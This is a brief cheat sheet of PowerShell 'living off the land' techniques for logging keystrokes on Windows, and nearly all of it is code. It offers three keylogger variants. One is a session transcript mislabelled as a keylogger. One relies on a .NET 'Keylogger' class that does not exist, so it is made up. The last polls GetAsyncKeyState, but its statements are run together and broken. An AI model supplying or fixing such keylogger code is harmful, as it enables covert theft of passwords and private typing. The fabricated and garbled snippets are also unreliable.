# Living off the Land

## 01 - Powershell

Execute the transcript log.

```
PS C:\> Start-Transcript -Path keylogger.log
```

Stop the transcript log.

```
PS C:\> Stop-Transcript
```

## 02 - Powershell .NET

First variant.

```powershell
PS C:\> $path = 'C:\temp\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object
System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys |
Out-File -FilePath $path
```

Second variant.

```powershell
PS C:\> Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class KeyLogger
{ [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i); } "@ while ($true) {
Start-Sleep -Milliseconds 100 for ($i = 8; $i -le 190; $i++) { if ([KeyLogger]::GetAsyncKeyState($i) -
eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Write-Host $Key } } }
```